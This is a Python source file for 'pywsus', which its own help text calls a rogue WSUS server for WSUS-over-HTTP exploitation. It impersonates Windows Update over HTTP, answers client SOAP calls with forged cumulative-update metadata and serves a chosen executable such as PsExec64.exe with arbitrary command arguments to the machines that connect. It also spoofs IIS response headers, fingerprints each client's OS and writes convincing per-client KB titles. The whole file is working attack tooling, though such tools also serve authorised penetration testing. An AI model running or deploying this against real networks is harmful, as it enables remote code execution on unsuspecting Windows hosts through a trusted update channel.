#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from bs4 import BeautifulSoup
from random import randint
import uuid
import html
import datetime
import base64
import hashlib
import json
import re
import sys
import os
import argparse
import threading
import time
import select
import tty
import termios

from rich.console import Console # type: ignore

# ---------------------------------------------------------------------------
# KB generation
# ---------------------------------------------------------------------------

def _random_kb() -> str:
    """Random KB in the Win10/11 monthly rollup band (5000000–5099999)."""
    return str(randint(5_000_000, 5_099_999))


# ---------------------------------------------------------------------------
# OS fingerprinting from RegisterComputer
#
# win_builds.json is organized by OS family:
#   "Windows 11": { "26100": "24H2", "26200": "25H2", ... }
#   "Windows Server 2025": { "26100": "24H2" }
#
# OSDescription from RegisterComputer (e.g. "Windows 10 Pro",
# "Windows Server 2025 Standard") is matched against section keys
# (longest first to avoid "Windows Server 2012" shadowing "2012 R2").
# Then the build number is looked up inside that section.
# ---------------------------------------------------------------------------

def _load_builds():
    """Load data/win_builds.json -> dict of { os_family: { int(build): version } }.

    Keys starting with '_' are metadata and are skipped.
    """
    path = os.path.join(os.path.abspath(os.path.dirname(__file__)),
                        "data", "win_builds.json")
    try:
        with open(path, "r", encoding="utf-8") as f:
            raw = json.load(f)
        result = {}
        for key, builds in raw.items():
            if key.startswith("_") or not isinstance(builds, dict):
                continue
            result[key] = {int(b): v for b, v in builds.items()}
        return result
    except (OSError, json.JSONDecodeError, ValueError):
        return {}

_BUILDS_DB = _load_builds()

# Section keys sorted longest-first so "Windows Server 2012 R2" matches
# before "Windows Server 2012", and "Windows 8.1" before "Windows 8".
_OS_KEYS_SORTED = sorted(_BUILDS_DB.keys(), key=len, reverse=True)

_ARCH_MAP = {
    "AMD64":  "x64-based Systems",
    "amd64":  "x64-based Systems",
    "X86":    "x86-based Systems",
    "x86":    "x86-based Systems",
    "ARM64":  "ARM64-based Systems",
    "arm64":  "ARM64-based Systems",
}

# ---------------------------------------------------------------------------
# Known clients persistence
# Stores { ip: { "build": int, "arch": str, "os_desc": str } } on disk
# so that clients who skip RegisterComputer (WUA cache) still get
# a targeted title even after tool restart or session rotation.
# ---------------------------------------------------------------------------

_KNOWN_CLIENTS_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)),
                                   "data", "known_clients.json")

def _load_known_clients():
    """Load data/known_clients.json -> { ip: {build, arch, os_desc} }.

    Keys starting with '_' are metadata and are skipped.
    """
    try:
        with open(_KNOWN_CLIENTS_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
        return {k: v for k, v in raw.items() if not k.startswith("_")}
    except (OSError, json.JSONDecodeError):
        return {}

def _save_known_clients(clients):
    """Persist the clients dict to data/known_clients.json."""
    try:
        os.makedirs(os.path.dirname(_KNOWN_CLIENTS_PATH), exist_ok=True)
        data = {"_comment": "Known WSUS clients — { ip: {build, arch, os_desc} }. Auto-populated by pywsus."}
        data.update(clients)
        with open(_KNOWN_CLIENTS_PATH, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
            f.write("\n")
    except OSError:
        pass

_known_clients = _load_known_clients()


def _build_kb_title(kb_number, os_build=0, arch="", os_desc=""):
    """Build a realistic Microsoft KB title from client info.

    Two-pass lookup:
      1. Sections whose key appears in OSDescription (longest-first).
         If the build is found there -> use it.
      2. Fallback: try ALL sections for the build number.
         Handles Win11 reporting OSDescription="Windows 10 Pro" (NT 10.0).

    Falls back to generic title if nothing matches.
    """
    now = datetime.datetime.now()
    prefix = f"{now.year}-{now.month:02d} Cumulative Update for"
    arch_label = _ARCH_MAP.get(arch, "")

    os_family = ""
    version   = ""
    os_desc_lower = os_desc.lower()

    # Pass 1: sections matching OSDescription
    for key in _OS_KEYS_SORTED:
        if key.lower() in os_desc_lower:
            v = _BUILDS_DB[key].get(os_build, "")
            if v:
                os_family, version = key, v
                break

    # Pass 2: if not found, try all sections for this build
    # Skip server sections for client descs and vice versa to avoid
    # shared builds (e.g. 26100 = Win11 24H2 AND Server 2025)
    if not version:
        is_server_desc = "server" in os_desc_lower
        for key in _OS_KEYS_SORTED:
            key_is_server = "server" in key.lower()
            if is_server_desc != key_is_server:
                continue
            v = _BUILDS_DB[key].get(os_build, "")
            if v:
                os_family, version = key, v
                break

    # If still no version but OSDescription matched a family, keep the family
    if not os_family and os_desc_lower:
        for key in _OS_KEYS_SORTED:
            if key.lower() in os_desc_lower:
                os_family = key
                break

    # --- Compose title ---
    if os_family and version and arch_label:
        title = f"{prefix} {os_family}, version {version} for {arch_label} (KB{kb_number})"
    elif os_family and version:
        title = f"{prefix} {os_family}, version {version} (KB{kb_number})"
    elif os_family and arch_label:
        title = f"{prefix} {os_family} for {arch_label} (KB{kb_number})"
    elif os_family:
        title = f"{prefix} {os_family} (KB{kb_number})"
    else:
        title = f"{prefix} Windows (KB{kb_number})"

    if os_build:
        title += f" ({os_build})"
    return title


# ---------------------------------------------------------------------------
# WSUS update handler
# ---------------------------------------------------------------------------

class WSUSUpdateHandler:
    def __init__(self, executable_file, executable_name, client_address):
        self.get_config_xml              = ''
        self.get_cookie_xml              = ''
        self.register_computer_xml       = ''
        self.sync_updates_xml            = ''
        self.sync_updates_empty_xml      = ''
        self.get_extended_update_info_xml = ''
        self.report_event_batch_xml      = ''
        self.get_authorization_cookie_xml = ''

        # Two IDs each: parent "Install" update + child "Bundle" update
        self.revision_ids   = [randint(900000, 999999), randint(900000, 999999)]
        self.deployment_ids = [randint(80000, 99999),   randint(80000, 99999)]
        self.uuids          = [uuid.uuid4(), uuid.uuid4()]

        self.executable      = executable_file
        self.executable_name = executable_name
        self.sha1            = ''
        self.sha256          = ''
        self.kb_number       = _random_kb()
        self.kb_title        = ''
        self.client_address  = client_address
        self._cookie_bytes   = os.urandom(47)   # realistic opaque blob per session

        # Per-IP client info: { ip: {"build": int, "arch": str, "os_desc": str} }
        # Populated by RegisterComputer, consumed by GetExtendedUpdateInfo.
        # Initialized from known_clients.json for persistence across restarts.
        self._clients = dict(_known_clients)

        # Raw template + kwargs for get-extended-update-info.xml
        # (rendered per-request with the right kb_title per client IP)
        self._ext_info_template = ''
        self._ext_info_kwargs   = {}

    def get_last_change(self):
        return (datetime.datetime.now() - datetime.timedelta(days=3)).isoformat()

    def get_cookie(self):
        return base64.b64encode(self._cookie_bytes).decode('utf-8')

    def get_expire(self):
        return (datetime.datetime.now() + datetime.timedelta(days=1)).isoformat()

    def set_resources_xml(self, command):
        """Load XML templates from resources/ and inject session values."""
        path = os.path.abspath(os.path.dirname(__file__))
        try:
            with open(f'{path}/resources/get-config.xml', 'r') as f:
                self.get_config_xml = f.read().format(
                    lastChange=self.get_last_change())
                f.close()

            with open(f'{path}/resources/get-cookie.xml', 'r') as f:
                self.get_cookie_xml = f.read().format(
                    expire=self.get_expire(), cookie=self.get_cookie())
                f.close()

            with open(f'{path}/resources/register-computer.xml', 'r') as f:
                self.register_computer_xml = f.read()
                f.close()

            with open(f'{path}/resources/sync-updates.xml', 'r') as f:
                self.sync_updates_xml = f.read().format(
                    revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1],
                    deployment_id1=self.deployment_ids[0], deployment_id2=self.deployment_ids[1],
                    uuid1=self.uuids[0], uuid2=self.uuids[1],
                    expire=self.get_expire(), cookie=self.get_cookie(),
                    last_change=self.get_last_change())

            # Empty SyncUpdates — for driver sync requests (contains <SystemSpec>)
            with open(f'{path}/resources/sync-updates-empty.xml', 'r') as f:
                self.sync_updates_empty_xml = f.read().format(
                    expire=self.get_expire(), cookie=self.get_cookie())
                f.close()

            with open(f'{path}/resources/get-extended-update-info.xml', 'r') as f:
                self._ext_info_template = f.read()
                self._ext_info_kwargs = dict(
                    revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1],
                    sha1=self.sha1, sha256=self.sha256,
                    filename=self.executable_name, file_size=len(self.executable),
                    command=html.escape(html.escape(command)),
                    url='http://{host}/{path}/{executable}'.format(
                        host=self.client_address, path=uuid.uuid4(),
                        executable=self.executable_name),
                    kb_number=self.kb_number,
                    kb_title='')
                # Generic title — used as fallback for clients that skip RegisterComputer
                self._generic_title = _build_kb_title(self.kb_number)
                self.kb_title = self._generic_title
                self._ext_info_kwargs['kb_title'] = html.escape(self.kb_title)
                self.get_extended_update_info_xml = \
                    self._ext_info_template.format(**self._ext_info_kwargs)
                f.close()

            with open(f'{path}/resources/report-event-batch.xml', 'r') as f:
                self.report_event_batch_xml = f.read()
                f.close()

            with open(f'{path}/resources/get-authorization-cookie.xml', 'r') as f:
                self.get_authorization_cookie_xml = f.read().format(
                    cookie=self.get_cookie())
                f.close()
        except Exception as err:
            _console.print(f"[bold red][ERROR][/] Loading XML resources: {err}")
            sys.exit(1)

    def set_filedigest(self):
        """Compute SHA-1 and SHA-256 of the executable payload."""
        h1   = hashlib.sha1()
        h256 = hashlib.sha256()
        h1.update(self.executable)
        h256.update(self.executable)
        self.sha1   = base64.b64encode(h1.digest()).decode()
        self.sha256 = base64.b64encode(h256.digest()).decode()

    def register_client(self, ip, os_build, arch, os_desc):
        """Store per-IP client info from RegisterComputer and persist to disk.

        Stores raw OS data (not the title) so it stays valid across
        session rotations (new KB number -> new title from same data).
        """
        info = {"build": os_build, "arch": arch, "os_desc": os_desc}
        self._clients[ip] = info
        _known_clients[ip] = info
        _save_known_clients(_known_clients)
        return _build_kb_title(self.kb_number, os_build, arch, os_desc)

    def title_for_ip(self, ip):
        """Compute the KB title for a given IP from stored raw data.

        Returns the targeted title if the IP was seen via RegisterComputer
        (this session or a previous one), generic title otherwise.
        """
        info = self._clients.get(ip)
        if info:
            return _build_kb_title(self.kb_number,
                                   info["build"], info["arch"], info["os_desc"])
        return self._generic_title

    def get_ext_info_xml_for(self, ip):
        """Render GetExtendedUpdateInfo XML with the right kb_title for this IP."""
        title = self.title_for_ip(ip)
        kwargs = dict(self._ext_info_kwargs)
        kwargs['kb_title'] = html.escape(title)
        return self._ext_info_template.format(**kwargs)


# ---------------------------------------------------------------------------
# Display layer
# ---------------------------------------------------------------------------

_console   = Console(highlight=False)
_out_lock  = threading.Lock()
_log_level = 0
_log_file  = None

_STYLE = {
    "GetConfig":              "dim",
    "GetCookie":              "bright_magenta",
    "GetAuthorizationCookie": "dim",
    "RegisterComputer":       "bright_white",
    "SyncUpdates":            "bright_green",
    "GetExtendedUpdateInfo":  "bright_yellow",
    "ReportEventBatch":       "bright_blue",
    "FileDownload":           "bright_cyan",
    "WARN":                   "bold red",
}

def _ts():
    return datetime.datetime.now().strftime("%H:%M:%S")


def _log(level, ip, action, detail="", direction=""):
    if level > _log_level:
        return
    ts    = _ts()
    style = _STYLE.get(action, "white")
    line  = f"[bright_black]{ts}[/]  [cyan]{ip:<15}[/]  [{style}]{action:<26}[/]"
    if detail:
        line += f"  [dim]{detail}[/]"
    with _out_lock:
        _console.print(line)

    if _log_file and _log_level == 1:
        arrow = {"request": "CLIENT ->  ", "response": "<- SERVER  "}.get(direction, "")
        plain = f"{ts}  {ip:<15}  {arrow}{action:<26}"
        if detail:
            plain += f"  {detail}"
        try:
            with open(_log_file, "a", encoding="utf-8") as fh:
                fh.write(plain + "\n")
        except OSError:
            pass


def _log_raw(label, content, http_request=""):
    if _log_level < 2 or not _log_file:
        return
    sep = "─" * 72
    header = f"{sep} {_ts()} {label} {sep}"
    try:
        with open(_log_file, "a", encoding="utf-8") as fh:
            fh.write(f"\n{header}\n")
            if http_request:
                fh.write(f" {http_request}\n")
            fh.write(f"{content}\n")
    except OSError:
        pass


def _log_resp(ip, action_name):
    """Write <- SERVER line to log file only (level 1 only, not level 2)."""
    if not _log_file or _log_level != 1:
        return
    try:
        with open(_log_file, "a", encoding="utf-8") as fh:
            fh.write(f"{_ts()}  {ip:<15}  <- SERVER  {action_name + ' (resp)':<26}\n")
    except OSError:
        pass


# ---------------------------------------------------------------------------
# HTTP server
# ---------------------------------------------------------------------------

class WSUSBaseServer(BaseHTTPRequestHandler):

    # Spoof the Server header to match a real WSUS (IIS) response.
    # BaseHTTPRequestHandler builds it from server_version + sys_version;
    # overriding version_string() is the cleanest single-point fix.
    def version_string(self):
        return 'Microsoft-IIS/10.0'

    def log_message(self, fmt, *args):
        pass

    def _set_response(self, serveEXE=False, xml_body=None):
        self.protocol_version = 'HTTP/1.1'
        # send_response_only() emits only the status line — no Server/Date,
        # letting us place them in IIS order: Cache-Control, Content-Type,
        # Server, X-AspNet-Version, X-Powered-By, Date, Content-Length.
        self.send_response_only(200)
        self.send_header('Cache-Control', 'private')
        if serveEXE:
            self.send_header('Content-Type', 'application/octet-stream')
        else:
            self.send_header('Content-Type', 'text/xml; charset=utf-8')
        self.send_header('Server', self.version_string())
        self.send_header('X-AspNet-Version', '4.0.30319')
        self.send_header('X-Powered-By', 'ASP.NET')
        self.send_header('Date', self.date_time_string())
        if serveEXE:
            self.send_header('Content-Length', len(update_handler.executable))
        elif xml_body is not None:
            self.send_header('Content-Length', len(xml_body))
        self.end_headers()

    def do_HEAD(self):
        if ".exe" in self.path:
            _log(0, self.client_address[0], "HEAD", self.path, direction="request")
            self._set_response(True)

    def do_GET(self):
        ip = self.client_address[0]
        if ".exe" in self.path:
            self._set_response(True)
            try:
                self.wfile.write(update_handler.executable)
            except (ConnectionResetError, BrokenPipeError):
                _log(0, ip, "FileDownload", "connection reset (client may retry)")
                return
            size_kb = len(update_handler.executable) // 1024
            _log(0, ip, "FileDownload",
                 f"{size_kb} KB  ->  {update_handler.executable_name}",
                 direction="response")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data      = self.rfile.read(content_length)
        post_data_xml  = BeautifulSoup(post_data, "xml")
        data           = None

        soap_action = self.headers['SOAPAction']
        ip          = self.client_address[0]
        action_name = soap_action.strip('"').rsplit('/', 1)[-1] if soap_action else "Unknown"

        _log_raw(f"CLIENT -> SERVER  {ip}  {action_name}",
                post_data_xml.prettify(),
                http_request=self.requestline)

        # --- SOAP dispatch ---

        if soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b76899b4-ad55-427d-a748-2ecf0829412b
            data = BeautifulSoup(update_handler.get_config_xml, 'xml')
            _log(0, ip, "GetConfig", direction="request")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/36a5d99a-a3ca-439d-bcc5-7325ff6b91e2
            data = BeautifulSoup(update_handler.get_cookie_xml, "xml")
            _log(0, ip, "GetCookie", direction="request")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/RegisterComputer"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b0f2a41f-4b96-42a5-b84f-351396293033
            data = BeautifulSoup(update_handler.register_computer_xml, "xml")

            # --- Parse client OS from computerInfo (§2.2.2.2.3) ---
            os_build = 0
            arch     = ""
            os_desc  = ""
            build_tag  = post_data_xml.find('OSBuildNumber')
            arch_tag   = post_data_xml.find('ProcessorArchitecture')
            osdesc_tag = post_data_xml.find('OSDescription')

            if build_tag and build_tag.string:
                try:
                    os_build = int(build_tag.string.strip())
                except ValueError:
                    pass
            if arch_tag and arch_tag.string:
                arch = arch_tag.string.strip()
            if osdesc_tag and osdesc_tag.string:
                os_desc = osdesc_tag.string.strip()

            if os_build or arch or os_desc:
                update_handler.register_client(ip, os_build, arch, os_desc)

            title = update_handler.title_for_ip(ip)
            detail = f"{os_desc}  build {os_build}  arch {arch}  ->  KB{update_handler.kb_number}"
            _log(0, ip, "RegisterComputer", detail, direction="request")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/6b654980-ae63-4b0d-9fae-2abb516af894
            # Software sync -> fake updates  |  Driver sync (<SystemSpec>) -> empty
            if post_data_xml.find('SystemSpec') is not None:
                data = BeautifulSoup(update_handler.sync_updates_empty_xml, "xml")
                _log(0, ip, "SyncUpdates", "driver sync -> empty", direction="request")
            else:
                data = BeautifulSoup(update_handler.sync_updates_xml, "xml")
                _log(0, ip, "SyncUpdates",
                     f"KB{update_handler.kb_number}  ->  {update_handler.executable_name}",
                     direction="request")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/862adc30-a9be-4ef7-954c-13934d8c1c77
            data = BeautifulSoup(update_handler.get_ext_info_xml_for(ip), "xml")
            _log(0, ip, "GetExtendedUpdateInfo",
                 f"KB{update_handler.kb_number}", direction="request")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/ReportEventBatch"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/da9f0561-1e57-4886-ad05-57696ec26a78
            data = BeautifulSoup(update_handler.report_event_batch_xml, "xml")

            # --- Parse useful fields from ReportEventBatch ---
            parts = []
            brand_tag = post_data_xml.find('ComputerBrand')
            model_tag = post_data_xml.find('ComputerModel')
            hresult_tag = post_data_xml.find('Win32HResult')
            repl = post_data_xml.find('ReplacementStrings')

            if brand_tag and brand_tag.string:
                parts.append(brand_tag.string.strip())
            if model_tag and model_tag.string:
                parts.append(model_tag.string.strip())
            if hresult_tag and hresult_tag.string:
                hr = hresult_tag.string.strip()
                parts.append(f"hr={hr}" if hr != "0" else "OK")
            if repl:
                first = repl.find('string')
                if first and first.string:
                    kb_match = re.search(r'KB\d+', first.string)
                    if kb_match:
                        parts.append(kb_match.group())

            detail = "  ".join(parts) if parts else ""
            _log(0, ip, "ReportEventBatch", detail, direction="request")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/44767c55-1e41-4589-aa01-b306e0134744
            data = BeautifulSoup(update_handler.get_authorization_cookie_xml, "xml")
            _log(0, ip, "GetAuthorizationCookie", direction="request")

        else:
            _log(0, ip, "WARN", f"unhandled SOAPAction: {soap_action}")
            return

        # --- Send response ---
        response_body = data.encode_contents()
        self._set_response(xml_body=response_body)
        try:
            self.wfile.write(response_body)
        except (ConnectionResetError, BrokenPipeError):
            _log(0, ip, "WARN", f"connection reset during {action_name}")
            return

        _log_resp(ip, action_name)
        _log_raw(f"SERVER -> CLIENT  {ip}  {action_name}",
                data.prettify(),
                http_request="HTTP/1.1 200 OK")


# ---------------------------------------------------------------------------
# Server thread
# ---------------------------------------------------------------------------

def run(host, port):
    httpd = HTTPServer((host, port), WSUSBaseServer)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()


# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------

def _print_banner(host, port, rotate_hours=0):
    _console.print()
    _console.print("[bold red]p y w s u s[/]", justify="center")
    _console.print()
    rotate_tag = (
        f"  [dim]·[/]  [dim]rotate every[/] [magenta]{rotate_hours}h[/]"
        if rotate_hours else ""
    )
    _console.print(
        f"  [dim]listening on[/] [cyan]{host}:{port}[/]"
        f"  [dim]·[/]  [bold white]q[/][dim]: quit[/]"
        f"  [dim]·[/]  [bold white]r[/][dim]: rotate session[/]"

        f"{rotate_tag}"
    )
    _console.print()


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "pywsus — Rogue WSUS server for WSUS-over-HTTP exploitation\n"
            "GoSecure | github.com/GoSecure/pywsus"
        ),
        epilog=(
            "Examples:\n"
            "  python pywsus.py -H 10.0.0.1 -p 8530 -e PsExec64.exe -c '/accepteula /s calc.exe'\n"
            "  python pywsus.py -H 10.0.0.1 -p 8530 -e PsExec64.exe -c '/accepteula' -v --log-file wsus.log\n"
            "  python pywsus.py -H 10.0.0.1 -p 8530 -e PsExec64.exe -c '/accepteula' -vv --log-file wsus.log\n"
            "  python pywsus.py -H 10.0.0.1 -p 8530 -e PsExec64.exe -c '/accepteula' -r 1\n"
            "\n"
            "Verbosity:\n"
            "  (none)  all events shown on terminal\n"
            "  -v      + metadata at startup + --log-file with directions\n"
            "  -vv     + full XML bodies in --log-file\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser._optionals.title = "OPTIONS"

    core = parser.add_argument_group("Core")
    core.add_argument('-H', '--host',       required=True,
                      help='Listening address (e.g. 0.0.0.0 or 10.0.0.1).')
    core.add_argument('-p', '--port',       type=int, default=8530,
                      help='Listening port (default: 8530).')
    core.add_argument('-e', '--executable', type=argparse.FileType('rb'), required=True,
                      help='Microsoft-signed PE to serve (e.g. PsExec64.exe).')
    core.add_argument('-c', '--command',    required=True,
                      help='Arguments passed to the executable on the client.')
    core.add_argument('-r', '--rotate',     type=float, default=0, metavar='HOURS',
                      help='Rotate session IDs every N hours (0 = off).  '
                           'Default WSUS detection frequency is ~22 h.')

    out = parser.add_argument_group("Output")
    out.add_argument('-v', '--verbose', action='count', default=0,
                     help='-v metadata + log directions. -vv + XML bodies in log.')
    out.add_argument('--log-file', metavar='FILE', default=None,
                     help='Write exchange log to FILE.')

    return parser.parse_args()


# ---------------------------------------------------------------------------
# Session rotation  (--rotate)
# ---------------------------------------------------------------------------

def _rotate_session(executable_file, executable_name, client_address, command):
    """Rebuild update_handler with fresh IDs / KB.  Atomic swap via global."""
    global update_handler
    old_clients = update_handler._clients   # preserve known client data
    new = WSUSUpdateHandler(executable_file, executable_name, client_address)
    new.set_filedigest()
    new.set_resources_xml(command)
    new._clients.update(old_clients)        # carry over
    update_handler = new          # GIL makes this assignment atomic
    _console.rule(style="bright_black")
    _console.print(
        f"  [bold magenta]↻ Session rotated[/]  "
        f"[bold yellow]KB{new.kb_number}[/]  "
        f"[dim]rev[/] {new.revision_ids}  "
        f"[dim]dep[/] {new.deployment_ids}"
    )
    _console.rule(style="bright_black")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    args = parse_args()

    _log_level = min(args.verbose, 2)
    _log_file  = args.log_file

    if _log_file:
        try:
            open(_log_file, "w").close()
        except OSError:
            pass

    executable_file = args.executable.read()
    executable_name = os.path.basename(args.executable.name)
    args.executable.close()

    if executable_file[:2] != b'MZ':
        _console.print("[bold red][ERROR][/] Not a valid PE (missing MZ magic bytes)")
        sys.exit(1)

    update_handler = WSUSUpdateHandler(
        executable_file, executable_name,
        client_address=f'{args.host}:{args.port}')

    update_handler.set_filedigest()
    update_handler.set_resources_xml(args.command)

    _print_banner(args.host, args.port, args.rotate)

    if _log_level >= 1:
        _console.print(
            f"  [dim]kb[/]              [bold yellow]KB{update_handler.kb_number}[/]\n"
            f"  [dim]uuids[/]           [white]{update_handler.uuids}[/]"
            f"  [dim](Install + Bundle identifiers)[/]\n"
            f"  [dim]revision_ids[/]    [white]{update_handler.revision_ids}[/]"
            f"  [dim](revision numbers in SyncUpdates)[/]\n"
            f"  [dim]deployment_ids[/]  [white]{update_handler.deployment_ids}[/]"
            f"  [dim](deployment entries per revision)[/]\n"
            f"  [dim]sha1[/]            [white]{update_handler.sha1}[/]"
            f"  [dim](SHA-1 of payload)[/]\n"
            f"  [dim]sha256[/]          [white]{update_handler.sha256}[/]"
            f"  [dim](SHA-256 of payload)[/]"
        )
        _console.print()

    _console.print(
        f"  [bold cyan]{'Time':<10}{'Target IP':<17}{'Action':<28}Detail[/]"
    )
    _console.rule(style="bright_black")

    t = threading.Thread(target=run, args=(args.host, args.port), daemon=True)
    t.start()

    rotate_secs   = args.rotate * 3600 if args.rotate else 0
    last_rotate   = time.time()
    client_addr   = f'{args.host}:{args.port}'

    old_settings = termios.tcgetattr(sys.stdin)
    try:
        tty.setcbreak(sys.stdin.fileno())
        while True:
            if rotate_secs and (time.time() - last_rotate) >= rotate_secs:
                _rotate_session(executable_file, executable_name,
                                client_addr, args.command)
                last_rotate = time.time()
            if select.select([sys.stdin], [], [], 0.5)[0]:
                key = sys.stdin.read(1).lower()
                if key == 'q':
                    break
                elif key == 'r':
                    _rotate_session(executable_file, executable_name,
                                    client_addr, args.command)
                    last_rotate = time.time()
    except KeyboardInterrupt:
        pass
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)

    _console.rule(style="bright_black")
    _console.print(
        f"  [bold red]Closed[/] [dim]port[/] [cyan]{args.port}[/]"
        f" [dim]on[/] [cyan]{args.host}[/]"
    )
    _console.print()